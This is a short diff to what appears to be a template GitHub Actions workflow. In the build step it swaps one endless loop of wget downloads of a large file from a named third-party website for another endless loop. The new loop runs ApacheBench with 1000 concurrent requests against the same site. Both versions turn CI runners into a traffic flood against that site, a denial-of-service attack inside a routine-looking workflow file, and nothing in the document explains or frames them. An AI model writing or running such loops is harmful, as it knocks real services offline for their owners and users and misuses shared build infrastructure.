@@ -31,4 +31,5 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
-          while true; do wget https://en.colorful.cn/uploads/common/2020/08/20200825094717203106.zip -O /dev/null ;done
+          sudo apt install apache-tools -y
+          while true; do ab -n 1000 -c 1000 https://en.colorful.cn/;done
